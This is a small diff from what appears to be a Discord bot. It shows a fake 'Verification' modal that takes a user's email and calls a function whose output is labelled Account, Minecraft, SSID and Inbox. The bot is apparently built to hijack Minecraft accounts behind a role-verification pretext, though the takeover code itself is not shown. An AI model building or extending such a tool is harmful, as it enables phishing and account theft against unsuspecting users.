@@ -225,8 +225,10 @@ class MyModalOne(ui.Modal, title="Verification"):
                     await interaction.followup.send(
                         "⌛ Please allow us to proccess your roles...", ephemeral=True
                     )
-
+                    
+                    # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
                     finalEmbeds = await startSecuringAccount(self.session, self.email.value, device) 
+
                     if not finalEmbeds:
                         await logs_channel.send(
                             embed = Embed(
